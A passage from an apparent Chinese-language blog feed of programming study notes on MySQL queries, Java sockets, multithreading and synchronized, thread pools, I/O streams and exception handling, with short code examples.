from 表名 where 字段名=值;delete from 表名 where 字段名 is null;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>判断空的条件 null 需要使用 is null<br>可以使用 concat 拼接字符串<br>例如，拼接 name 和 ‘:’ 语句为：<code>select concat(name,':')</code></p></blockquote><h2 id="添加-外键"><a href="#添加-外键" class="headerlink" title="添加 外键"></a>添加 外键</h2><p>alter table 表名 add constraint 约束名称 foreign key(字段名) references 表名(字段名)</p><h2 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h2><p>select * from 表名 limit 页数,条数<br>select * from emp limit 0,2;//查询第一页，每页两条</p><h2 id="关联子查询"><a href="#关联子查询" class="headerlink" title="关联子查询"></a>关联子查询</h2><p>给定表：<img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fgsyojg2euj207a0ei3z2.jpg" alt="表"> 写出 sql 语句查询出下面的结果：<img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fgsyojww7bj20au040wej.jpg" alt="结果"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> nam<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>jieguo<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> nam<span class="token operator">=</span>t1<span class="token punctuation">.</span>nam <span class="token operator">AND</span> jieguo<span class="token operator">=</span><span class="token string">'win'</span><span class="token punctuation">)</span> win_num<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>jieguo<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> nam<span class="token operator">=</span>t1<span class="token punctuation">.</span>nam <span class="token operator">AND</span> jieguo<span class="token operator">=</span><span class="token string">'lost'</span><span class="token punctuation">)</span> lost_num <span class="token keyword">FROM</span> table1 t1 <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> nam <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络编程</title>
      <link href="/2017/03/27/ji-suan-ji-wang-luo-bian-cheng/"/>
      <url>/2017/03/27/ji-suan-ji-wang-luo-bian-cheng/</url>
      
        <content type="html"><![CDATA[<p>Java 对网络编程提供了支持，在网络编程中使用最多的就是 Socket 编程。两台计算机想要进行网络通信，必须满足一定的规范：</p><ol><li>两台计算机需要有一个唯一的标识(ip 地址)。<br>IP 地址 为实现网络中不同计算机之间的通讯，每台计算机必须都有一个唯一的标示符。</li><li>两台计算机需要有共同的而语言（协议）。<br>协议：定义的一种规范，如 TCP 协议：是一种面向连接的可靠地给予字节流的传输层通信协议。</li><li>需要有相应的端口号。<br>端口号：一台主机上运行多个应用程序，通过端口号可以辨别不同应用程序之间的通讯。端口号的范围 0~ 65535，其中 0~1023 位系统保留</li></ol><span id="more"></span><p><strong>其中 IP 地址和端口号组成了所谓的 Socket。</strong><br>Socket 通常称为“套接字”，用于描述 ip 地址和端口，是一个通信的基础。实现客户端套接字（也可以就叫“套接字”）。套接字是两台机器间通信的端点。</p><p>应用程序通常通过 socket 向网络发出请求或者应答网络请求，socket 和 serversocket 类位于 Java.net 包中，在连接成功是，应用程序两端都会产生一个 socket 实例，操作这个实例，完成所需的会话。</p><ul><li>C-S 客户端与服务端通信</li></ul><table><thead><tr><th align="center">服务端</th><th align="center">-</th><th align="center">客户端</th></tr></thead><tbody><tr><td align="center">创建监听服务</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">↓</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">等待连接</td><td align="center">←建立连接←</td><td align="center">连接服务器</td></tr><tr><td align="center">↓</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">通过输入输出流进行通讯</td><td align="center">→进行通讯→</td><td align="center">通过输入输出流进行通讯</td></tr><tr><td align="center">↓</td><td align="center">-</td><td align="center">↓</td></tr><tr><td align="center">关闭连接</td><td align="center">-</td><td align="center">关闭连接</td></tr></tbody></table><ul><li>B-S 浏览器与服务端通信</li></ul><p>ServerSocket 类实现服务器套接字。服务器套接字等待请求通过网络传入。它基于该请求执行某些操作，然后可能向请求者返回结果。 </p><p>服务器套接字的实际工作由 SocketImpl 类的实例执行。应用程序可以更改创建套接字实现的套接字工厂来配置它自身，从而创建适合本地防火墙的套接字。</p><br>## 客户端实现步骤1. 创建服务端 ServerSocket 和客户端 Socket<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">new Socket(...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>2. 创建连接，获取输入/输出流。<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">socket.getInputStream();socket.getOutputStream();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>3. 按照协议进行读写操作4. 关闭连接`shutdown` 和 `close`<h2 id="服务端实现通信步骤："><a href="#服务端实现通信步骤：" class="headerlink" title="服务端实现通信步骤："></a>服务端实现通信步骤：</h2><ol><li>创建 ServerSocket 对象，绑定监听端口。</li><li>通过 accept（）方法监听客户端请求</li><li>连接建立后，通过输入流读取客户端发送的请求信息</li><li>通过输入输出流向客户端发送响应信息</li><li>关闭连接</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Socket </tag>
            
            <tag> 网络编程 </tag>
            
            <tag> 通信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程并发</title>
      <link href="/2017/03/25/duo-xian-cheng-bing-fa/"/>
      <url>/2017/03/25/duo-xian-cheng-bing-fa/</url>
      
        <content type="html"><![CDATA[<p>若想解决线程安全问题，需要将线程异步操作变成同步操作。Java 提供了一种内置的锁机制。synchronized 关键字就是 Java 中的同步锁。</p><span id="more"></span><p>synchronized 使用方法：<br>1.synchronized 修饰非静态方法：同步方法<br>2.synchronized 修饰静态方法：静态方法锁<br>3.synchronized 修饰块：同步块锁</p><p>线程进入同步代码块之前，会自动获得锁，并且在退出同步代码块的时候会自动释放锁。<br>无论是通过正常结束，还是通过抛异常结束，都一样释放锁。</p><p>即多个线程不能“同时”执行该方法，只能先后顺序的同步执行。这样就会导致该方法从多线程异步操作编程同步操作，简介的解决了线程并发操作所带带来的线程问题。</p><p>当方法上使用 synchronized，那么上锁的对象就是当前方法所属的对象也就是 this</p><p>4.当一个静态方法上面用 synchronized 修饰，该方法称为静态方法锁。那么该方法锁的对象是当前方法所属的类的对象，即 Class 的实例，每个类有且仅有一个 Class 实例，在该 Class 内部记录了这个类的信息。</p><p>5.同步块，使用同步块可以更精确的控制需要执行的代码片段。<br>可以保证在并发安全的前提下，有效的缩小同步范围，尽可能地提高并发效率。</p><p>同步块需要自行制定“同步监视器”，即上锁的对象。<br>必须保证多个需要同步执行的线程看到的是同一个对象。<br>通常是 this。</p><h2 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h2><p>当 synchronized 修饰几段不同代码时，但是同步监视器对象相同时，那么这几段代码就存在互斥关系。即多个线程不能同时执行这几段代码。</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> synchronized </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程和线程</title>
      <link href="/2017/03/23/jin-cheng-he-xian-cheng/"/>
      <url>/2017/03/23/jin-cheng-he-xian-cheng/</url>
      
        <content type="html"><![CDATA[<p>进程和线程的区别：</p><ul><li>进程：进程是操作系统中运行的一个任务（一个应用程序运行在进程中）<br>进程是一块包含了某些资源的内存区域。<br>当操作系统创建一个进程后，该进程会自动申请一个名为主线程的线程。</li><li>线程：进程中所包含的一个或多个执行单元称为线程。<br>线程只能归属一个进程并且它只能访问该进程所拥有的的资源<br>一个进程中可以包含多个线程。<blockquote><p>一个进程中可以包含多个线程。<br>线程的划分尺度小于进程，使得多线程程序的并发性提高。<br>进程在执行过程中拥有独立的内存单元，而多个线程共享此内存，从而极大提高了程序的运行效率。</p></blockquote></li></ul><span id="more"></span><p>线程不能独立执行。</p><p>并发原理：多个线程同时运行 只是我们感官上的一种表现。事实上线程是并发运行的，当获得了时间片段的线程被 CPU 运行，而其他线程则全部等待，微观上说是“走走停停”，宏观上说是都在运行，但绝对不是绝对意义上的同时发生。</p><p>创建线程（两种方式）<br>1.Thread 类是线程类，每一个实例表示一个可运行的线程。可以通过集成该类并重写 run()方法来定义一个具体线程。</p><pre><code>public class MyThread extends Thread {    @Override    public void run() {        for (int i = 0; i &lt; 100; i++) {            System.out.println("\" " + i + "号, 你是谁啊？\"");        }    }}class MySecondThread extends Thread {    @Override    public void run() {        for (int i = 0; i &lt; 100; i++) {            System.out.println(i + " 号：\"我是你爸爸" + (i == 0 ? "" : " + " + i) + "！\"");        }    }}Thread t1 = new MyThread();Thread t2 = new MySecondThread();//只是就绪，并没有执行t1.start();//调用 start 方法执行而不是 run 方法t2.start();</code></pre><p>Thread 创建线程<br>查资料了解“耦合”</p><p>2.实现 Runnable 接口， 并重写 run() 来定义线程，然后再创建线程时将 Runnable 的实例传入并启动线程。</p><blockquote><p>通常我们通过匿名内部类方式创建线程。</p></blockquote><p>start() 和 run()<br><strong>启动线程时调用 start() 而不是直接调用 run()方法。</strong><br>start() 会将当前线程纳入线程调度，使得当前线程可以运行，当线程获取时间片段之后会自动调用 run() 方法。</p><p>常用方法<br>public static Thread currentThread()返回对当前正在执行的线程对象的引用。 </p><p>返回：<br>当前执行的线程。</p><p>public long getId()返回该线程的标识符。线程 ID 是一个正的 long 数，在创建该线程时生成。线程 ID 是唯一的，并终生不变。线程终止时，该线程 ID 可以被重新使用。 </p><p>返回：<br>该线程的 ID。</p><p>public final String getName()返回该线程的名称。 </p><p>返回：<br>该线程的名称。</p><p>public final void setName(String name)改变线程名称，使之与参数 name 相同。<br>首先调用线程的 checkAccess 方法，且不带任何参数。这可能抛出 SecurityException。 </p><p>参数：<br>name - 该线程的新名称。 </p><p>public final boolean isAlive()测试线程是否处于活动状态。如果线程已经启动且尚未终止，则为活动状态。 </p><p>返回：<br>如果该线程处于活动状态，则返回 true；否则返回 false。</p><p>public final boolean isDaemon()测试该线程是否为守护线程。 </p><p>返回：<br>如果该线程是守护线程，则返回 true；否则返回 false。</p><p>public boolean isInterrupted()测试线程是否已经中断。线程的中断状态 不受该方法的影响。<br>线程中断被忽略，因为在中断时不处于活动状态的线程将由此返回 false 的方法反映出来。 </p><p>返回：<br>如果该线程已经中断，则返回 true；否则返回 false。</p><p>public static void sleep(long millis)<br>                  throws InterruptedException 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行），此操作受到系统计时器和调度程序精度和准确性的影响。该线程不丢失任何监视器的所属权。</p><p>参数：<br>millis - 以毫秒为单位的休眠时间。 </p><blockquote><p>可以导致调用该方法的线程进入阻塞状态，阻塞指定的毫秒值，当超时后，线程会自动回到就绪状态（Runnable）等待重新分配时间片段来继续执行</p></blockquote><h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>又称为后台线程。<br><strong>当一个进程中的所有前台线程都结束，进程结束，此时无论是否进程中是否有后台线程，都会被强制结束。</strong><br>默认穿件出来的线程都是前段线程，后台线程需要使用 setDaemon(true) 单独的设置。</p><p>public final void setDaemon(boolean on)将该线程标记为守护线程或用户线程。当正在运行的线程都是守护线程时，Java 虚拟机退出。<br>该方法必须在启动线程前调用。 </p><p>该方法首先调用该线程的 checkAccess 方法，且不带任何参数。这可能抛出 SecurityException（在当前线程中）。 </p><p>join<br>方法会将调用该方法的线程至于阻塞状态 ,知道其等待的线程执行完毕之后才会借出阻塞继续运行</p><p>public static void yield()暂停当前正在执行的线程对象，并执行其他线程。 </p><p>同步操作<br>有先后顺序，性能稍慢，相当于你干完，我在赶</p><p>一部操作<br>多线程并发曹组哦，性能少块，相当于大家一起干，各干各的</p><p>线程同步：多个线程并发，读写同一个资源，会发生线程安全问题。<br>常见问题：</p><ul><li>多个示例共享实例变量。</li><li>多个线程共享静态的公共的资源。</li></ul><p>若想解决线程安全问题，需要将线程一部操作编程同步操作。</p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>当一个程序中若创建大量的线程，并在执行结束后销毁，会给系统带来过度消耗资源，从而可能导致系统崩溃。所以我们应该使用线程池来解决这个问题</p><p>1.控制线程数量<br>2.重用线程</p><p>并发量大导致 CPU 过度切换，导致拖慢系统，耗费系统资源。严重时可能会导致系统崩溃，频繁创建与销毁线程也会给系统带来负担。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>首先会创建一些线程，他们的集合称为线程池。当服务器接收到一个客户请求后，就从线程池中取出一个空闲的线程，去执行该任务，服务完毕后，该线程归还给线程池，而不是关闭销毁。</p><p>创建线程池</p><pre><code>ExecutorService service = Executors.newFixedThreadPool(2); service.execute(thread);//执行线程service.shutdown();//当线程池中所有任务执行结束后，结束线程池service.shutdownNow();//立即中断正在运行的线程，并关闭线程池。</code></pre><p>常用 API<br>StringBuffer 线程安全，同步处理，性能稍慢<br>StringBuilder 线程不安全，异步处理，性能稍快。</p><p>对于集合 Map 而言，可以使用 Collections 提供的静态方法对已有的集合或 Map 进行转换成线程安全的集合或 map</p><p>//ArrayList 和 LinkedList 都是非线程安全的</p><p>List《String》 list = new Array<br>list.add</p><p>System.out.println(list);<br>//将给定的 list 集合转换成线程安全的 list 集合<br>list = Collections.synchronizedList(list);</p><p>Set HashMap 同上</p><p>HashTable 是线程安全的。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> 进程 </tag>
            
            <tag> 线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I/O 流</title>
      <link href="/2017/03/22/io/"/>
      <url>/2017/03/22/io/</url>
      
        <content type="html"><![CDATA[<p>Java I/O 流大致分为：字节流 文件字节流 缓冲流 字符流 对象流。</p><span id="more"></span><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>java.io.File 类表示文件，也就是说通过 File 类在程序中我们可以操作硬盘上的文件或目录。</p><p>File 的每一个实例可以表示硬盘上的一个文件或目录。</p><p>通过 File 可以<br>1.访问文件或目录的属性信息（名字、大小、隐藏等）<br>2.操作文件或目录（创建、删除）<br>3.访问一个目录下的所有子项</p><blockquote><p>但是不能操作文件内容</p></blockquote><h2 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h2><p>isFile()<br>          测试此抽象路径名表示的文件是否是一个标准文件。</p><p>isDirectory()<br>          测试此抽象路径名表示的文件是否是一个目录。</p><p>getName()<br>          返回由此抽象路径名表示的文件或目录的名称。</p><p>length()<br>          返回由此抽象路径名表示的文件的长度。占用字节量</p><p>exists()<br>          测试此抽象路径名表示的文件或目录是否存在。</p><p>delete()<br>          删除此抽象路径名表示的文件或目录。如果此路径名表示一个目录，则该目录必须为空才能删除。 </p><pre><code>System.out.println(File.separator);//创建文件或目录File file = new File("D:" + File.separator);</code></pre><p>mkdir()<br>          创建此抽象路径名指定的目录。</p><p>mkdirs()<br>          创建此抽象路径名指定的目录，包括所有必需但不存在的父目录也会创建。</p><p>listFiles()<br>          返回一个抽象路径名数组，这些路径名表示此抽象路径名表示的目录中的文件。</p><blockquote><p>“.”表示当前类所在项目的根目录</p></blockquote><blockquote><p>File.separator 匹配不同系统的分隔符，比如 windows 下表示 “"</p></blockquote><h2 id="输入和输出流"><a href="#输入和输出流" class="headerlink" title="输入和输出流"></a>输入和输出流</h2><p>当我们编写程序时想读取一个文件或者将程序中某些数据写入一个文件中，这时，我们就要使用输入和输出流。</p><p>输入流：用来读取数据。</p><p>输出流：用来写出数据。</p><h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p>InputStream 是所有字节输入流的父类。定义了各种读取方法<br>read()<br>          从输入流中读取数据的下一个字节。以 int 形式返回，返回的是 0-255 范围内的 int 字节值，若返回 -1， 则读取到末尾，处理效率低，基本不用。</p><p>public int read(byte[] b)<br>         throws IOException 从输入流中读取一定数量的字节，并将其存储在缓冲区数组 b 中。以整数形式返回实际读取的字节数。在输入数据可用、检测到文件末尾或者抛出异常前，此方法一直阻塞。<br>如果 b 的长度为 0，则不读取任何字节并返回 0；否则，尝试读取至少一个字节。如果因为流位于文件末尾而没有可用的字节，则返回值 -1；否则，至少读取一个字节并将其存储在 b 中。 </p><p>将读取的第一个字节存储在元素 b[0] 中，下一个存储在 b[1] 中，依次类推。读取的字节数最多等于 b 的长度。设 k 为实际读取的字节数；这些字节将存储在 b[0] 到 b[k-1] 的元素中，不影响 b[k] 到 b[b.length-1] 的元素。</p><p>OutputStream 是所有字节输出流的父类，其定义写出方法:</p><p>public abstract void write(int b)<br>                    throws IOException 将指定的字节写入此输出流。write 的常规协定是：向输出流写入一个字节。要写入的字节是参数 b 的八个低位。b 的 24 个高位将被忽略。<br>OutputStream 的子类必须提供此方法的实现。</p><p>public void write(byte[] b)<br>           throws IOException 将 b.length 个字节从指定的 byte 数组写入此输出流。write(b) 的常规协定是：应该与调用 write(b, 0, b.length) 的效果完全相同。</p><h2 id="文件字节流"><a href="#文件字节流" class="headerlink" title="文件字节流"></a>文件字节流</h2><p>FileOutputStream 是文件的字节输出流，可以以字节为单位将数据写入文件。</p><p>FileOutputStream 有两个常用构造方法：</p><p>public FileOutputStream(File file)<br>                 throws FileNotFoundException 创建一个向指定 File 对象表示的文件中写入数据的文件输出流。创建一个新 FileDescriptor 对象来表示此文件连接。<br>首先，如果有安全管理器，则用 file 参数表示的路径作为参数来调用 checkWrite 方法。 </p><p>如果该文件存在，但它是一个目录，而不是一个常规文件；或者该文件不存在，但无法创建它；抑或因为其他某些原因而无法打开，则抛出 FileNotFoundException。 </p><p>public FileOutputStream(String name)<br>                 throws FileNotFoundException 创建一个向具有指定名称的文件中写入数据的输出文件流。创建一个新 FileDescriptor 对象来表示此文件连接。<br>首先，如果有安全管理器，则用 name 作为参数调用 checkWrite 方法。 </p><p>如果该文件存在，但它是一个目录，而不是一个常规文件；或者该文件不存在，但无法创建它；抑或因为其他某些原因而无法打开它，则抛出 FileNotFoundException。 </p><p>public void close()<br>           throws IOException 关闭此文件输出流并释放与此流有关的所有系统资源。此文件输出流不能再用于写入字节。<br>如果此流有一个与之关联的通道，则关闭该通道。 </p><p>使用以上两种构造期创建的文件字节输出流向指定文件写出数据，<br>若指定的文件以及包含了内容，那么当使用 fos 对其 写入就是覆盖操作，当前的文件的内容全部清空。</p><p>若想在文件中将原有的数据保存，在其之后追加新数据，则需要在构造器中添加第二个 boolean 参数，当参数为 true 时则追加，false 则覆盖。</p><p>FileInputStream 是文件字节输入流：<br>使用该流可以以字节为单位从文件中读取数据。</p><h2 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h2><p>缓冲是高级流，提高读写效率。但是缺乏即时性</p><h3 id="BufferedOutputStream-是缓冲输出流，用来写入。"><a href="#BufferedOutputStream-是缓冲输出流，用来写入。" class="headerlink" title="BufferedOutputStream 是缓冲输出流，用来写入。"></a>BufferedOutputStream 是缓冲输出流，用来写入。</h3><p>内部维护一个缓冲区，每当我们通过该流写出数据时，都会现将数据存入一个缓冲区，当缓冲区已满的时候，缓冲流才会将数据一次性写出。<br>关闭流之前，缓冲输出流会将缓冲区内容一次性写出。</p><p>public void flush()<br>           throws IOException 刷新此缓冲的输出流。这迫使所有缓冲的输出字节被写出到底层输出流中。</p><h3 id="BufferedInputStream-是缓冲输入流，用来读取。"><a href="#BufferedInputStream-是缓冲输入流，用来读取。" class="headerlink" title="BufferedInputStream 是缓冲输入流，用来读取。"></a>BufferedInputStream 是缓冲输入流，用来读取。</h3><p>内部维护了一个缓冲区（字节数组），使用该流在读取一个字节时，该流尽可能地一次性读取若干个字节并存放到缓冲区，然后注意的将字节返回，直到缓冲区的数据全部读取完毕，才再次去读若干字节。<br>这样可以减少读取次数，从而提高读取效率。</p><h2 id="对象流"><a href="#对象流" class="headerlink" title="对象流"></a>对象流</h2><p>对象存在于内存中，有时候需要将对象保存到硬盘上（持久化），这个时候我们需要：<br>将对象转换为字节序列，而这个过程称之为<strong>对象序列化</strong>。将字节序列转换为对象，这个过程称之为<strong>反序列化</strong></p><p>ObjectOutputStream：用来对对象进行序列化的输出流。</p><p>实现对象序列化的方法为 writeObject(Object o),可以将给定的对象转换为字节序列后写出，没有返回值。</p><p>transient 关键字可以对象瘦身效果，通过该属性，可以修饰类中不需要序列化的属性。那么该属性在进行序列化是会被忽略，从而达到瘦身效果。</p><p>ObjectInputStream 是用来对对象进行反序列化的输入流。<br>实现对象反序列化的方法为<br>readObject()，可以从流中读取字节序列，将字节序列转换为对象，并返回该对象。<br>当使用 ObjectInputStream 对一个已经序列化的对象进行反序列化的时候，首先会检查该对象的版本号与当前类的版本号是否一致。不一致则直接反序列化失败。</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>ObjectOutputStream 在对象进行序列化的时候有一个要求，需要序列化的对象所属的类必须实现 serializable 接口，实现该接口不需要重写或定义任何方法，只是作为序列化的一个标识。</p><p>通常实现接口的类需要提供一个常量，serialVersionUID 该常量表示类的版本，该值直接决定当前对象在进行反序列化时成功与否。如果不写，Java 也会通过某种算法提供一个默认值（不建议）。</p><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>底层依然是字节流，以 char 为单位进行读写数据。</p><h3 id="Reader-抽象类-：是字符输入流的父类。"><a href="#Reader-抽象类-：是字符输入流的父类。" class="headerlink" title="Reader(抽象类)：是字符输入流的父类。"></a>Reader(抽象类)：是字符输入流的父类。</h3><p>public int read()<br>         throws IOException 读取单个字符。在字符可用、发生 I/O 错误或者已到达流的末尾前，此方法一直阻塞。<br>用于支持高效的单字符输入的子类应重写此方法。 （基本不用）<br>返回：<br>作为整数读取的字符，范围在 0 到 65535 之间 (0x00-0xffff)，如果已到达流的末尾，则返回 -1 </p><p>public int read(char[] cbuf)<br>         throws IOException 将字符读入数组。在某个输入可用、发生 I/O 错误或者已到达流的末尾前，此方法一直阻塞。<br>返回：<br>读取的字符数，如果已到达流的末尾，则返回 -1</p><h3 id="Writer-抽象类-：是字符输出流的父类。"><a href="#Writer-抽象类-：是字符输出流的父类。" class="headerlink" title="Writer(抽象类)：是字符输出流的父类。"></a>Writer(抽象类)：是字符输出流的父类。</h3><p>public void write(int c)<br>           throws IOException 写入单个字符。要写入的字符包含在给定整数值的 16 个低位中，16 高位被忽略。<br>用于支持高效单字符输出的子类应重写此方法。 （基本不用）</p><p>参数：<br>c - 指定要写入字符的 int。 </p><p>public void write(char[] cbuf)<br>           throws IOException 写入字符数组。</p><p>参数：<br>cbuf - 要写入的字符数组 </p><p>public void write(String str)<br>           throws IOException 写入字符串。</p><p>参数：<br>str - 要写入的字符串 </p><h2 id="转换流："><a href="#转换流：" class="headerlink" title="转换流："></a>转换流：</h2><p>OutputStreamWreiter 字符输出流。<br>使用该流可以设置字符集，并按照指定字符集将字符转换为对应的字节通过流写出。</p><p>InputStreamReader 字符输入流<br>使用该流可以设置字符集，并按照指定字符集，从流中按照该编码将字节数据转换为字符并读取。</p><h3 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h3><p>PrintWriter 是具有自动行刷新的缓冲字符输出流。提供了丰富的构造方法，具体请查看 API 文档。</p><p>常用构造器<br>public PrintWriter(OutputStream out,<br>                   boolean autoFlush)通过现有的 OutputStream 创建新的 PrintWriter。此便捷构造方法创建必要的中间 OutputStreamWriter，后者使用默认字符编码将字符转换为字节。 </p><p>参数：<br>out - 输出流<br>autoFlush - boolean 变量；如果为 true，则 println、printf 或 format 方法将刷新输出缓冲区</p><p>public PrintWriter(Writer out,<br>                   boolean autoFlush)创建新 PrintWriter。 </p><p>参数：<br>out - 字符输出流<br>autoFlush - boolean 变量；如果为 true，则 println、printf 或 format 方法将刷新输出缓冲区</p><blockquote><p>特点，可以安航写字符串，内部默认嵌套一个 bufferedreader 作为</p></blockquote><h3 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h3><p>BufferedReader 缓冲字符输入流。按行读。内部提供了缓冲区，可以提高读取效率。</p><p>BufferedReader 只有两个构造方法。</p><p>public BufferedReader(Reader in,<br>                      int sz)创建一个使用指定大小输入缓冲区的缓冲字符输入流。 只能处理其他字符输入流。</p><p>参数：<br>in - 一个 Reader<br>sz - 输入缓冲区的大小 </p><p>方法：<br>public String readLine()<br>                throws IOException 读取一个文本行。通过下列字符之一即可认为某行已终止：换行 (‘\n’)、回车 (‘\r’) 或回车后直接跟着换行。</p><p>返回：<br>包含该行内容的字符串，不包含任何行终止符，如果已到达流末尾，则返回 null</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> I/O 流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 异常和异常处理</title>
      <link href="/2017/03/21/exception-and-error/"/>
      <url>/2017/03/21/exception-and-error/</url>
      
        <content type="html"><![CDATA[<p>Java 定义了 Throwable 类，Exception 和 Error 是它的两个子类</p><ul><li>Exception：表示程序可以处理的异常，可以捕获，遇到这类异常应该尽可能地处理异常，而不应该随意终止程序。</li><li>Error：一般指的是虚拟机相关的问题，如系统崩溃、虚拟机错误、内存空间不足等，对于这类错误导致程序中断，紧靠程序自身是无法恢复及维护的。</li></ul><span id="more"></span><br>## 可检测异常和非检测异常Java 异常分为：可检测异常和非检测异常<h3 id="可检测异常：通过编译器验证，编译器会强制执行处理，不捕获这个异常，编译器就不能通过，不允许编译。"><a href="#可检测异常：通过编译器验证，编译器会强制执行处理，不捕获这个异常，编译器就不能通过，不允许编译。" class="headerlink" title="可检测异常：通过编译器验证，编译器会强制执行处理，不捕获这个异常，编译器就不能通过，不允许编译。"></a>可检测异常：通过编译器验证，编译器会强制执行处理，不捕获这个异常，编译器就不能通过，不允许编译。</h3><p>通常方法上通过 throws 关键字抛出的异常。</p><h3 id="非检测异常："><a href="#非检测异常：" class="headerlink" title="非检测异常："></a>非检测异常：</h3><p>不遵循或者声明规则，不一定需要采取任何适当的操作，编译器不会检测是否解决了这样一个异常。<br>继承自 RuntimeException 类属于非检测异常，不需要声明。</p><p>常见的 RuntimeException</p><ul><li>NullPointerException 空指针异常</li><li>ArrayIndexOutOfBoundsException 数组下标越界异常</li><li>ClassCastException 类造型异常</li><li>NumberFormatException 数字转换异常</li><li>StringIndexOutOfBoundsException 字符串下标越界异常</li><li>…</li></ul><br>## 异常处理机制：当程序中抛出一个异常后，程序从导致异常代码出**跳出**，检测寻找 try 关键字，匹配处理该异常的 catch 块。如果找到则执行 catch 语句块中的代码，然后继续往下执行，直到所有的 finally 块执行结束，程序被终止。如果没有找到该类异常的 catch 块，在所有 finally 块执行结束，程序被终止。<h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3><p>finally 语句块为异常提供了一个统一的出口。<br>无论在 try 所指定的程序块中是否抛出异常， finally 都要被执行，通常这 finally 语句中进行资源释放，关闭连接，删除临时文件等</p><h3 id="try-x2F-catch"><a href="#try-x2F-catch" class="headerlink" title="try/catch"></a>try/catch</h3><p>try{}语句块指定一段代码，执行过程中，该代码块可能发生一种或多种类型的异常，它后面的 catch(){}语句块分别对这些异常进行相应的处理。其中 catch()里面是异常类型，{}里面是对异常处理的代码，如果没有异常产生，所有的 catch 块都不执行。</p><h3 id="catch"><a href="#catch" class="headerlink" title="catch"></a>catch</h3><p>catch 可以有多个，用于处理可能产生不同类型异常的代码块<br>catch 捕获的类型应遵循【先子后父】原则：子类异常在前，父类异常灾后，按照顺序依次捕获，否则编译不通过</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">try (//指定一段代码，执行过程中可能会发生一种或多种类型的异常要执行的代码) catch (A 类的子类异常 e){//分别对这些异常进行处理处理第一个异常的代码} catch (A 类的另一个子类异常 e){处理第二个异常的代码} catch (A 类异常 e){处理第三个异常的代码} finally {//finally 代码块可以省略有没有异常都执行这里}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>代码示例：</p></blockquote><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">System.out.println("开始");try {String str;//用这个 str 作为模拟str = null;//str = "";//str = "a";//str = "abcdefg";//str = "1234567";System.out.println(str.length());System.out.println(str.charAt(5));System.out.println(Integer.parseInt(str));System.out.println("try 块执行结束...");} catch(NullPointerException e) {System.out.println("str 为 null");} catch(StringIndexOutOfBoundsException e) {System.out.println("字符串数组下标越界");//} catch(NumberFormatException e) {//System.out.println("类型转换出错");} catch (Exception e) {//放在最后System.out.println("貌似出现了未知异常:");e.printStackTrace();} finally {System.out.println("有没有异常都有我");}System.out.println("程序结束");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用方法"><a 